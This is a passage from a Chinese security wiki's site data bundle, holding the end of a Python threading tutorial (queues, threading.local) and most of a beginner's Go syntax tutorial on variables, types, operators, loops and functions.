queue.qsize()<1000:\n                for i in range(100):\n                    count += 1\n                    msg = '生成产品' + str(count)\n                    queue.put(msg)\n                    print(msg)\n            time.sleep(0.5)\nclass consumer(threading.thread):\n    def run(self):\n        global queue\n        while true:\n            if queue.qsize()>100:\n                for i in range(3):\n                    msg=self.name+'消费了'+queue.get()\n                    print(msg)\n            time.sleep(1)\nif __name__ == '__main__':\n    queue = queue()\n    p=producer()\n    p.start()\n    time.sleep(1)\n    c=consumer()\n    c.start()\n\n    \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# threadlocal\n\n我们知道多线程环境下，每一个线程均可以使用所属进程的全局变量。如果一个线程对全局变量进行了修改，将会影响到其他所有的线程对全局变量的计算操作，从而出现数据混乱，即为脏数据。为了避免多个线程同时对变量进行修改，引入了线程同步机制，通过互斥锁来控制对全局变量的访问。所以有时候线程使用局部变量比全局变量好，因为局部变量只有线程自身可以访问，同一个进程下的其他线程不可访问。但是局部变量也是有问题，就是在函数调用的时候，传递起来很麻烦。示例如下：\n\ndef process_student(name):\n    std=student(name)\n    do_task1(std)\n    do_task2(std)\n    \ndef do_task1(std):\n    do_sub_task1(std)\n    do_sub_task2(std)\n    \ndef do_task2(std):\n    do_sub_task1(std)\n    do_sub_task2(std)\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n从上面的实例可以看到每个函数一层一层调用都需要传递std参数，非常麻烦，如果使用全局变量也不行，因为每个线程处理不同的student对象，不能共享。因此 python 还提供了threadlocal 变量，它本身是一个全局变量，但是每个线程却可以利用它来保存属于自己的私有数据，这些私有数据对其他线程也是不可见的。\n\nimport threading\n# 创建全局threadlocal对象:\nlocal = threading.local()\ndef process_student():\n    # 获取当前线程关联的name:\n    student_name = local.name\n    print('线程名：%s 学生姓名:%s' % (threading.current_thread().name,student_name))\ndef process_thread(name):\n    # 绑定threadlocal的name:\n    local.name = name\n    process_student()\nt1 = threading.thread(target=process_thread, args=('张三',), name='thread-a')\nt2 = threading.thread(target=process_thread, args=('李四',), name='thread-b')\nt1.start()\nt2.start()\nt1.join()\nt2.join()\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n",charsets:{cjk:!0},lastUpdated:"2022/04/06, 13:02:34",lastUpdatedTimestamp:1649250154e3},{title:"Go语言基础语法",frontmatter:{title:"Go语言基础语法",date:"2022-04-07T21:00:00.000Z",permalink:"/sec/dev/go/basicgrammar",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["安全开发","Go"],tags:["Go"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/202.%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/2021.Go/00.Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95.html",relativePath:"02.安全/202.安全开发/2021.Go/00.Go语言基础语法.md",key:"v-556cb44a",path:"/sec/dev/go/basicgrammar/",headers:[{level:2,title:"简介",slug:"简介",normalizedTitle:"简介",charIndex:15},{level:2,title:"数据类型",slug:"数据类型",normalizedTitle:"数据类型",charIndex:366},{level:3,title:"变量",slug:"变量",normalizedTitle:"变量",charIndex:375},{level:3,title:"数据类型",slug:"数据类型-2",normalizedTitle:"数据类型",charIndex:366},{level:3,title:"常量",slug:"常量",normalizedTitle:"常量",charIndex:4774},{level:3,title:"运算符",slug:"运算符",normalizedTitle:"运算符",charIndex:5440},{level:2,title:"流程控制",slug:"流程控制",normalizedTitle:"流程控制",charIndex:7206},{level:3,title:"分支 - 选择",slug:"分支-选择",normalizedTitle:"分支 - 选择",charIndex:7215},{level:3,title:"循环",slug:"循环",normalizedTitle:"循环",charIndex:8301},{level:3,title:"跳转语句",slug:"跳转语句",normalizedTitle:"跳转语句",charIndex:8814},{level:2,title:"函数",slug:"函数",normalizedTitle:"函数",charIndex:1074},{level:3,title:"参数列表",slug:"参数列表",normalizedTitle:"参数列表",charIndex:9952},{level:3,title:"函数的嵌套调用",slug:"函数的嵌套调用",normalizedTitle:"函数的嵌套调用",charIndex:10847},{level:3,title:"函数返回值",slug:"函数返回值",normalizedTitle:"函数返回值",charIndex:11326},{level:3,title:"函数类型",slug:"函数类型",normalizedTitle:"函数类型",charIndex:12433},{level:3,title:"作用域",slug:"作用域",normalizedTitle:"作用域",charIndex:12736},{level:3,title:"匿名函数",slug:"匿名函数",normalizedTitle:"匿名函数",charIndex:13262},{level:3,title:"递归函数",slug:"递归函数",normalizedTitle:"递归函数",charIndex:13693},{level:2,title:"工程",slug:"工程",normalizedTitle:"工程",charIndex:13989},{level:2,title:"数据格式",slug:"数据格式",normalizedTitle:"数据格式",charIndex:13996},{level:3,title:"数组",slug:"数组",normalizedTitle:"数组",charIndex:3122},{level:3,title:"切片",slug:"切片",normalizedTitle:"切片",charIndex:4071},{level:3,title:"字符串",slug:"字符串",normalizedTitle:"字符串",charIndex:2364},{level:3,title:"字典Map",slug:"字典map",normalizedTitle:"字典map",charIndex:14027},{level:3,title:"结构体struct",slug:"结构体struct",normalizedTitle:"结构体struct",charIndex:14037},{level:3,title:"指针",slug:"指针",normalizedTitle:"指针",charIndex:7048},{level:2,title:"面向对象",slug:"面向对象",normalizedTitle:"面向对象",charIndex:12710},{level:2,title:"异常",slug:"异常",normalizedTitle:"异常",charIndex:14067},{level:2,title:"文本处理",slug:"文本处理",normalizedTitle:"文本处理",charIndex:14074}],excerpt:'<h1 id="go语言基础语法"><a class="header-anchor" href="#go语言基础语法">#</a> Go语言基础语法</h1>\n<h2 id="简介"><a class="header-anchor" href="#简介">#</a> 简介</h2>\n<p>Go语言是一种类C的语言，执行效率较高，在安全方面比较适合用来编写扫描器。扫描速度会比Python快不少。同时如果Go语言也可以用来开发服务器，在高并发的场景下适应能力比较好。所以从安全方面来说，Go语言值的学习，一方面是开发一些工具；另一方面，如果遇到GO语言开发的项目，也可以进行相关的代码审计。</p>\n',headersStr:"简介 数据类型 变量 数据类型 常量 运算符 流程控制 分支 - 选择 循环 跳转语句 函数 参数列表 函数的嵌套调用 函数返回值 函数类型 作用域 匿名函数 递归函数 工程 数据格式 数组 切片 字符串 字典Map 结构体struct 指针 面向对象 异常 文本处理",content:'# Go语言基础语法\n\n\n# 简介\n\nGo语言是一种类C的语言，执行效率较高，在安全方面比较适合用来编写扫描器。扫描速度会比Python快不少。同时如果Go语言也可以用来开发服务器，在高并发的场景下适应能力比较好。所以从安全方面来说，Go语言值的学习，一方面是开发一些工具；另一方面，如果遇到GO语言开发的项目，也可以进行相关的代码审计。\n\n注释，从最简单的注释开始说起，Go语言中的注释和Java语言、C语言一样。除了没有Java语言中的文档注释。如下所示：\n\npackage main\n\nimport "fmt"\n\nfunc main() {\n  // 单行注释\n  /*\n\t\t多行注释\n\t*/\n  fmt.Println("hello world")\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 数据类型\n\n\n# 变量\n\n声明，Go语言中使用var进行变量的声明，变量声明的格式如下，注意，在Go语言中，变量声明之后必须要使用。\n\nvar a int\nvar b int\nvar c, d int\nprint(a, b, c, d) // 0000\n\n\n1\n2\n3\n4\n\n\n初始化，在声明变量的同时，可以对情进行初始化，如果没有进行初始化，则GO语言会给变量一个默认的值。\n\n\tvar a int = 10\n\n\n1\n\n\n赋值，出了在声明变量的时候完成变量的初始化以外，还可以在变量定义之后变量赋值，先声明后赋值的模式：\n\nvar a int\na = 10\nprint(a)\n\n\n1\n2\n3\n\n\n自动推导类型，我们在声明变量的时候也可以不指定变量的类型，根据变量后面的赋值语句由go自己推导当前变量的类型：\n\na := "abc"\nprint(a)            // 10 +1.000000e+001 abc\nfmt.Printf("%T", a) // int float64 string\n\n\n1\n2\n3\n\n\n多重赋值，当我们需要给多个变量赋值时，可以使用多重赋值的方式。多重赋值同样支持自动类型推导。\n\na, b, c, d := 1, 1.1, "aaa", \'a\'\nfmt.Println(a, b, c, d)\nfmt.Printf("%T\\t%T\\t%T\\t%T\\n", a, b, c, d)\n\n//1 1.1 aaa 97\n//int     float64 string  int32\n\n\n1\n2\n3\n4\n5\n6\n\n\n匿名变量，我们可以使用_去接收一个我们不想要的变量，这个在后面的函数调用接收返回值的时候非常有用，这里记住就好。\n\na, _, b, _, c := 1, 2, 3, 4, 5\nfmt.Println(a, b, c)\n// 1 3 5\n\n\n1\n2\n3\n\n\n打印输出，在Go语言中有多种输出方式，第一种输出方式是采用fmt.Println的方式，这种输出会将参数打印出来，并换行。还有一种是fmt.Printf这种输出方式可以定义输出的格式，类似于C语言中的printf()。\n\na := 10\nb := 20\nfmt.Println("a=", a, ",b=", b) //a= 10 ,b= 20\n\n\n1\n2\n3\n\n\n格式化输出的相关语法和占位符在后面fmt相关的章节中介绍。\n\n接收输入，出了可以输出内容，还可以从控制台上接受用户输入的值，存储到变量中。和C很像。\n\nvar age int\nfmt.Scanf("%d", &age)\nfmt.Println("age=", age)\n\n// 20\n//age= 20\n\n\n1\n2\n3\n4\n5\n6\n\n\n另外一种获取用户输入的方式是直接使用fmt.Scan：\n\nvar age int\nfmt.Scan(&age)\n\nfmt.Println("age=", age)\n\n//30\n//age= 30\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 数据类型\n\nGo语言中有多种数据类型。如下表所示：\n\n类型          名称     长度   零值      说明\nbool        布尔类型   1    false   其值不为真即为假，不可以用数字代表true或false\nbyte        字节型    1    0       uint8别名\nint, uint   整型     -    0       有符号32位或无符号64位\nint8        整型     1    0       -128 ~ 127,\nuint8       整型     1    0       0 ~ 255\nint16       整型     2    0       -32768 ~ 32767,\nuint16      整型     2    0       0 ~ 65535\nint32       整型     4    0       -2147483648 到 2147483647\nuint32      整型     4    0       0 到 4294967295(42亿)\nint64       整型     8    0       -9223372036854775808到 92233720368547758070\nuint64      整型     8    0       到 18446744073709551615(1844京)\nfloat32     浮点型    4    0.0     小数位精确到7位\nfloat64     浮点型    8    0.0     小数位精确到15位\nstring      字符串         ""      utf-8字符串\n\n# 1. bool类型\n\n这个类型用于表示对还是错，常用在判断上。有true和false两种值。\n\n// 使用自动推导类型\nb := true\nfmt.Println("b=", b)\nfmt.Printf("b= %t\\n", b)\n//b= true\n//b= true\n\nvar b bool\nb = false\nfmt.Printf("b= %t\\n Type of b is %T", b, b)\n//b= false\n// Type of b is bool\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 2. 浮点类型\n\n在Go语言中有两种浮点数的类型，float32、float64。默认使用自动推导类型得到的是一个float64的浮点数。\n\nvar f float32\nf = 1.2\nfmt.Printf("%.2f\\n", f)\n\nf2 := 1.2\nfmt.Printf("f2= %f\\nType of f2 is %T", f2, f2)\n\n//1.20\n//f2= 1.200000\n//Type of f2 is float64\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# 3. 字符类型\n\nGo语言中的字符类型实际上存储的是字符的ASCII码，因此可以和数字进行替换。在定义的时候也是使用的数字类型byte（unit8类型的别名）。如下的例子所示：\n\nvar a byte\na = \'a\'\nfmt.Printf("%c\\n", a) //a\nfmt.Printf("%d", a) // 97\n\n\n1\n2\n3\n4\n\n\n\n\n# 4. 字符串类型\n\n字符串类型实际上是多个字符类型的连续，是字符的数组。字符使用单引号而字符串使用的是双引号。\n\nvar str string\nstr = "hello world"\nfmt.Printf("%s", str) // hello world\n\n\n1\n2\n3\n\n\n字符串类型也可以使用Scan输入：\n\nvar str string\nfmt.Scanf("%s", &str) //hello world haha\nfmt.Println(str)  //hello\n\n\n1\n2\n3\n\n\n在输入的时候，默认是以空格、换行作为分割符，因此只有hello被接收了。\n\n# 字符和字符串的区别\n\n 1. 字符使用单引号、字符串使用双引号\n 2. 转义符号也是一个字符\n 3. 字符串后面会有一个\\0\n\nc := \'a\'\nstr := "a"\nfmt.Printf("type of c is %T\\n", c)\nfmt.Printf("type of str is %T\\n", str)     \nfmt.Printf("len of str is %d\\n", len(str))\nfmt.Printf("str[1]: %c\\n", str[0])         \n//type of c is int32\n//type of str is string\n//len of str is 1\n//str[1]: a\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# fmt输入输出的格式\n\n在上面哦们使用到了fmt.Printf、fmt.Scanf输出和输入内容，在这了可以使用一些特殊的占位符，用于表示不同的格式和数据类型，如下表所示：\n\n格式   含义\n%%   一个%字面量\n%b   一个二进制整数值(基数为2)，或者是一个(高级的)用科学计数法表示的指数为2的浮点数\n%c   字符型。可以把输入的数字按照ASCII码相应转换为对应的字符\n%d   一个十进制数值(基数为10)\n%f   以标准记数法表示的浮点数或者复数值\n%o   一个以八进制表示的数字(基数为8)\n%p   以十六进制(基数为16)表示的一个值的地址，前缀为0x,字母使用小写的a-f表示\n%q   使用Go语法以及必须时使用转义，以双引号括起来的字符串或者字节切片[]byte，或者是以单引号括起来的数字\n%s   字符串。输出字符串中的字符直至字符串中的空字符（字符串以\'\\0‘结尾，这个\'\\0\'即空字符）\n%t   以true或者false输出的布尔值\n%T   使用Go语法输出的值的类型\n%x   以十六进制表示的整型值(基数为十六)，数字a-f使用小写表示\n%X   以十六进制表示的整型值(基数为十六)，数字A-F使用小写表示\n\n\tfmt.Printf("%%\\n")\n\tfmt.Printf("%b\\n", 4)\n\tfmt.Printf("%c\\n", 97)\n\tfmt.Printf("%d\\n", 97)\n\tfmt.Printf("%f\\n", 1.1)\n\tfmt.Printf("%o\\n", 16)\n\tfmt.Printf("%p\\n", 16)\n\tfmt.Printf("%q\\n", \'1\')\n\tfmt.Printf("%s\\n", "helloworld")\n\tfmt.Printf("%t\\n", false)\n\tfmt.Printf("%T\\n", false)\n\tfmt.Printf("%x\\n", 16)\n\tfmt.Printf("%X\\n", 16)\n\t\n\t//%\n\t//100\n\t//a\n\t//97\n\t//1.100000\n\t//20\n\t//%!p(int=16)\n\t//\'1\'\n\t//helloworld\n\t//false\n\t//bool\n\t//10\n\t//10\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 常量\n\n变量和常量不同，变量在定义和初始化之后，可以改变变量的值。而常量一旦定义就不能改变值了。\n\nvar a int\na = 10\na = 20\n\nconst b int = 20\n//b = 30 // 错误\n\n\n1\n2\n3\n4\n5\n6\n\n\n**字面常量 **，在代码中硬编码的常量，我们给变量赋值时值、字符串的内容等都是字面常量。\n\n"abc"\n123\n1.1\nflase\n\n\n1\n2\n3\n4\n\n\niota枚举 iota枚举是一个常量的生成器，可以生成一组有规律的常量，而不用每一行都写一个常量的初始化表达式。语法是：在第一个声明的变量所在的行，iota的值是0，每多一个常量则加一。\n\nconst (\n  a = iota\n  b = iota\n  c = iota\n)\nfmt.Println(a, b, c) // 0 1 2\n\n\n1\n2\n3\n4\n5\n6\n\n\n也可以只写一个iota。\n\nconst (\n  a = iota\n  b\n  c\n  d\n)\nfmt.Println(a, b, c, d) // 0 1 2 3\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n如果iota在同一个层级，则这一行的值一样。\n\nconst (\n  a       = iota\n  b, c, d = iota, iota, iota\n  e       = iota\n  f       = iota\n)\nfmt.Println(a, b, c, d, e, f) // 0 1 1 1 2 3\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 运算符\n\n上面一节介绍了Go语言中多种数据类型，这一节是使用不同的运算符对上面提到的数据类型进行运算。有些操作符过于简单，其他语言中也都有类似的定义，这里就不赘述了。\n\n# 1. 算数运算符\n\n运算符   术语          示例         结果\n+     加           10 + 5     15\n-     减           10 - 5     5\n*     乘           10 * 5     50\n/     除           10 / 5     2\n%     取模(取余)      10 % 3     1\n++    后自增，没有前自增   a=0; a++   a=1\n--    后自减，没有前自减   a=2; a--   a=1\n\n# 2. 类型转换\n\nGo语言中不允许隐式转换，所有类型转换必须显式声明（强制转换），而且转换只能发生在两种相互兼容的类型之间。\n\n强制类型转换的方式：数据类型名(待转换的值)\n\n当大容量的数据转到小容量的数据时会丢失精度，例如float转int会丢失精度。\n\n# 3. 赋值运算符\n\n运算符   说明       示例\n=     普通赋值     c = a + b 将a + b 表达式结果赋值给 c\n+=    相加后再赋值   c += a 等价于c = c + a\n-=    相减后再赋值   c -= a 等价于c = c - a\n*=    相乘后再赋值   c *= a 等价于 c = c * a\n/=    相除后再赋值   c /= a 等价于 c = c / a\n%=    求余后再赋值   c %= a 等价于 c = c % a\n\n# 4. 关系运算符\n\n关系运算符通常用于比较两个数据之间的关系，关系运算符的运算结果是bool类型。下面是常见的一些关系运算符。\n\n运算符   术语     示例       结果\n==    相等于    4 == 3   false\n!=    不等于    4 != 3   true\n<     小于     4 < 3    false\n>     大于     4 > 3    true\n<=    小于等于   4 <= 3   false\n>=    大于等于   4 >= 1   true\n\n# 5. 逻辑运算符\n\n逻辑运算符用于对bool值进行运算，有与或非三种运算，在其他语言中有短路与、短路或等，在go语言中默认就是短路与和短路或。\n\n运算符   术语   示例       结果\n!     非    !a       如果a为假，则!a为真； 如果a为真，则!a为假。\n&&    与    a && b   如果a和b都为真，则结果为真，否则为假。\n||    或    a || b   如果a和b有一个为真，则结果为真，二者都为假时，结果为假。\n\n运算结果列表：\n\n逻辑与：\n\n表达式1    表达式2    表达式1&&表达式2\nTrue    True    True\nFalse   True    False\nTrue    False   False\nFalse   False   false\n\n逻辑或：\n\n表达式1    表达式2    表达式1||表达式2\nTrue    True    True\nTrue    False   True\nFalse   True    True\nFalse   False   false\n\n逻辑非：\n\n表达式     !表达式\nTrue    False\nFalse   true\n\n# 6. 其他运算符\n\n运算符   术语       示例   说明\n&     取地址运算符   &a   变量a的地址\n*     取值运算符    *a   指针变量a所指向内存的值\n\n后面在指针的之后，会专门使用到这两种运算符。\n\n# 7. 运算符的优先级\n\n优先级   运算符\n7     ^ !\n6     / % << >>&&^\n5     + - | ^\n4     == != < <= >= >\n3     <-\n2     &&\n1     ||\n\n\n# 流程控制\n\n\n# 分支 - 选择\n\n# if\n\n和其他的编程语言一样，在Go中实现选择结构的也是If语句，只不过格式上面和其他的语言略有差异。相比而言，Go语言中的if语句比其他语言中的if语句更加灵活。\n\n//相比其他语言中更灵活的写法\n// 可以在定义的时候 处理变量\nif a = 10;a==10 {\n  fmt.Println("a == 10")\n}\n\n\n// if else - else if\nvar score float64\nfmt.Printf("请输入您的分数：")\nfmt.Scanf("%f", &score)\n\nif score >= 90 {\n  fmt.Println("优秀")\n} else if score >= 80 {\n  fmt.Println("良好")\n} else if score >= 60 {\n  fmt.Println("及格")\n} else {\n  fmt.Println("继续努力")\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n# switch结构\n\nswitch有两种语法格式，如下所示：\n\nvar score float64\nfmt.Scanf("%f", &score)\n\nswitch score {\n  case 10:\ncase 20:\n  fmt.Println("20")\n  case 30:\n  fmt.Println("30")\n  case 100:\n  fmt.Println("nice")\n\n  default:\n  fmt.Println("others")\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n和其他语言不一样，这里的case不能多层的继承，在其他语言中，使用break表示结束当前case，而在go语言中，case默认就只有一层。\n\n第二种用法是在case后面跟上判断表达式：\n\nvar score float64\nfmt.Scanf("%f", &score)\nswitch {\n  case score >= 90:\n  fmt.Println("优秀")\n  case score >= 80:\n  fmt.Println("良好")\n  case score >= 60:\n  fmt.Println("及格")\n  default:\n  fmt.Println("再接再厉")\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 循环\n\n循环结构顾名思义就是重复的完成某一个任务，在其他语言中可能有while、do-while、for等多种循环的格式，但是在go语言中，就只有for循环一种。\n\nfor循环的语法格式如下：\n\nfor 表达式1;表达式2;表达式3{\n\t循环体\n}\n表达式1:定义一个循环的变量，记录循环的次数\n表达式2：一般为循环条件，循环多少次\n表达式3：一般为改变循环条件的代码，使循环条件终有一天不再成立\n循环体：重复要做的事情。\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n以上代码的执行顺序是：\n\n然后执行表达式2，判断循环条件是否成立，如果表达式2返回的结果为true，\n\n则执行循环体。当执行完循环体后，执行表达式3，然后执行表达式2（这时不会在执行表达式1）继续判断循环条件是否成立，\n\n如果成立则继续执行循环体，如果不成立，则跳出for循环。\n\n举例子：输出十次hello world\n\nfor i := 0; i < 10; i++ {\n  fmt.Println("helloworld")\n}\n\n\n1\n2\n3\n\n\n死循环：\n\nfor {\n  fmt.Println("helloworld")\n}\n\n\n1\n2\n3\n\n\n\n# 跳转语句\n\nc语言中的跳转语句常常让人诟病，因为太过灵活导致代码可读性较差。Go语言中也有跳转语句，通常配合break、continue使用。\n\n# break\n\n前面我们写了一个死循环，如果想在循环里面结束这个循环，则需要用到break。如下所示：\n\nvar i int = 0\n\nfor {\n  i += 20\n  fmt.Println(i)\n  if i%3 == 0 {\n    fmt.Println(i)\n    break\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nBreak的作用是跳出循环。而continue的作用是跳出当前循环，进行下一次循环。如下所示：\n\nvar i int = 0\nfor {\n  i += 20\n  fmt.Println("i = ", i)\n  if i%3 == 0 {\n    fmt.Println("i % 3== 0")\n    continue\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# 循环嵌套\n\n直接打印一个九九乘法表：\n\nfor i := 1; i <= 9; i++ {\n  for j := 1; j <= i; j++ {\n    fmt.Printf("%d*%d=%d\\t", j, i, i*j)\n  }\n  fmt.Println()\n}\n\n//1*1=1   \n//1*2=2   2*2=4   \n//1*3=3   2*3=6   3*3=9   \n//1*4=4   2*4=8   3*4=12  4*4=16  \n//1*5=5   2*5=10  3*5=15  4*5=20  5*5=25  \n//1*6=6   2*6=12  3*6=18  4*6=24  5*6=30  6*6=36  \n//1*7=7   2*7=14  3*7=21  4*7=28  5*7=35  6*7=42  7*7=49  \n//1*8=8   2*8=16  3*8=24  4*8=32  5*8=40  6*8=48  7*8=56  8*8=64  \n//1*9=9   2*9=18  3*9=27  4*9=36  5*9=45  6*9=54  7*9=63  8*9=72  9*9=81  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 函数\n\n函数就是将一堆代码进行重用的一种机制。函数就是一段代码，一个函数就像一个专门做这件事的人，我们调用它来做一些事情，它可能需要我们提供一些数据给它，它执行完成后可能会有一些执行结果给我们。要求的数据就叫参数，返回的执行结果就是返回值。\n\n\n# 参数列表\n\n# 普通参数列表\n\n普通参数列表的参数数量是确定的。\n\nfunc Test(a int, b int) {\n\tfmt.Println("a=", a, ",b=", b)\n}\n\n\n1\n2\n3\n\n\n对于多个同类型的参数可以简写：\n\n// 这样写不清晰\nfunc Test(a,b int, str string ,f1,f2 float64) {\n\tfmt.Println("a=", a, ",b=", b)\n}\n\n\n1\n2\n3\n4\n\n\n# 不定参数\n\n不定参数是指在传递参数时，参数的个数无法确定。我们可以使用…的方式代表这里有多个参数。接收到的参数以数组的形式存储。如下所示：\n\nfunc Test(args ...int) {\n  for i := 0; i < len(args); i++ {\n    fmt.Printf("args[%d]=%d\\n", i, args[i])\n  }\n}\n\nfunc main() {\n  Test(1, 2, 3, 4, 5, 1, 1, 1, 1)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n使用range遍历不定参数，这里使用了多重赋值的方式。\n\nfor i, arg := range args {\n  fmt.Println(i, arg)\n}\n\n\n1\n2\n3\n\n\n如果在遍历过程中不需要索引，但是在Go语言中声明的变量必须使用，因此我们就可以使用匿名变量去接受索引值。\n\nfunc Test(a int, args ...float64) {\n\tfor _, data := range args {\n\t\tfmt.Println(data)\n\t}\n}\n\n\n1\n2\n3\n4\n5\n\n\n需要注意的是，在使用了 不定参数之后，如果需要添加一个指定名称的参数，则必须放到不定参数之前，也就是说，不定参数只能放到参数列表的最后面。\n\n// a 只能放在第一个位置\nfunc Test(a int , args ... float64)  {\n\tfmt.Println(a,args[0])\n}\n\n\n1\n2\n3\n4\n\n\n\n# 函数的嵌套调用\n\n和if语句可以嵌套一样，函数也可以嵌套调用，比如说我们在main函数中调用了打印函数，实际上也是嵌套调用的一种。这实际上非常好理解和编写代码，但是需要注意的是，在嵌套调用函数的时候，当传递不定参数时，需要使用如下的写法：\n\nfunc Test1(args ...int)  {\n\tTest2(args...)\n}\n\nfunc Test2(args ...int)  {\n\tfor _,data:=range args{\n\t\tfmt.Println(data)\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n如果我们只想传递一部分参数，而不是全部，则可以使用切片的方式，这很python：\n\nfunc Test1(args ...int) {\n\tTest2(args[:2]...)\n}\n\nfunc Test2(args ...int) {\n\tfor _, data := range args {\n\t\tfmt.Println(data)\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n具体切片的用法，会在后面提到。\n\n\n# 函数返回值\n\n# 单个返回值\n\n函数返回值顾名思义就是执行完成函数之后需要返回给调用的值，和其他语言中不同go语言可以返回多个返回值。返回值的定义语法如下：\n\n第一种写法：\n\nfunc Test(args ...int) int {\n\tfmt.Println("helloworld")\n\treturn 123\n}\n\n\n1\n2\n3\n4\n\n\n第二种写法：\n\n// 这种写法是先声明了一个变量\nfunc Test(args ...int) (returnValue int) {\n\tfmt.Println("helloworld")\n\treturnValue = 123\n\treturn returnValue\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n第三种写法：\n\n// 因为第二种写法定义了一个变量 go已经知道要返回的值是什么了，因此可以省略。\nfunc Test(args ...int) (returnValue int) {\n\tfmt.Println("helloworld")\n\treturnValue = 123\n\treturn \n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n对于上面的例子，可以使用下面的方式接受返回值：\n\nfunc sum(args ...int) (sum int) {\n\tfor _, data := range args {\n\t\tsum += data\n\t}\n\treturn\n\n}\n\nfunc main() {\n\tresult := sum(1, 2, 3, 4)\n\tfmt.Println("result=", result)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 多返回值\n\n多返回值实际上和单个返回值类似，只是接受的时候使用多个变量，定义的时候定义多个返回值即可。\n\n\n/*\n\t计算传入数据的总和 平均数\n*/\nfunc Calc(args ...int) (sum int, div float64) {\n\tfor _, data := range args {\n\t\tsum += data\n\t}\n\tdiv = float64(sum) / float64(len(args))\n\t//div = float64(sum / len(args))\n\treturn\n\n}\n\nfunc main() {\n\tsum, div := Calc(1, 2, 3, 4)\n\tfmt.Println("sum=", sum, ",div=", div)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 函数类型\n\nGo语言中还有另一种定义和使用函数的方式就是使用函数类型，函数类型就是将函数作为一种类型来定义变量，定义的方式如下所示：\n\nfunc Sum(a int, b int) int {\n\treturn a + b\n}\n\ntype MyFunc func(a, b int) (sum int)\n\nfunc main() {\n\tvar fun MyFunc\n\tfun = Sum\n\tresult := fun(1, 2)\n\tfmt.Println(result)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n先记住这种语法，在面向对象之后就能体会到这种语法的奇妙之处。\n\n\n# 作用域\n\n# 局部变量\n\n局部变量是指在一个大括号内定义的变量，该变量的作用域就在这个大括号之内。如下所示，a是一个局部变量，只在Test内部有效，当执行完Test之后，a就销毁了。\n\nfunc Test() {\n\ta := 1\n\tb := 20\n\tfmt.Println(a, b) //1 20\n}\nfunc main() {\n\ta := 20\n\tTest()\n\tfmt.Println(a) //20\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# 全局变量\n\n全局变量是定义在全局的变量，也就是定义在函数之外的变量，可以被全局的使用。如下所示：\n\nvar i int = 200\n\nfunc Test() {\n\ti = 100\n\tfmt.Println("i=", i) // 100\n}\n\nfunc main() {\n\tTest()\n\tfmt.Println(i) //100\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n总结：\n\n * 在函数外边定义的变量叫做全局变量。\n * 全局变量能够在所有的函数中进行访问\n * 如果全局变量的名字和局部变量的名字相同，那么使用的是局部变量的，小技巧强龙不压地头蛇\n\n\n# 匿名函数\n\n我们在前面定义函数的时候，都需要给函数一个名字，实际上我们可以不用给函数名字。如下所示：\n\nfunc main() {\n\tf := func() {\n\t\tfmt.Println("helloworld")\n\t}\n\tf()\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n实际上我们在调用匿名函数时往往使用如下的方式：\n\nfunc main() {\n\tfunc(a, b int) {\n\t\tfmt.Println("a+b=", a+b)\n\t}(1, 2)\n}\n\n\n1\n2\n3\n4\n5\n\n\n当匿名函数有返回值时，也可以接受返回值。\n\nfunc main() {\n\tx, y := func(a, b int) (sum, div float64) {\n\t\tsum = float64(a + b)\n\t\tdiv = sum / 2.0\n\t\treturn\n\t}(1, 2)\n\n\tfmt.Println(x, y)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 递归函数\n\n递归函数实际上算不了是一种函数的类型，而更多的是一种算法结构，递归函数的本质就是函数自己调用自己。如下的例子计算n的阶乘：\n\nfunc Test(n int) (result int) {\n\tif n == 1 {\n\t\treturn 1\n\t}\n\tresult = Test(n-1) * n\n\treturn\n}\n\nfunc main() {\n\tresult := 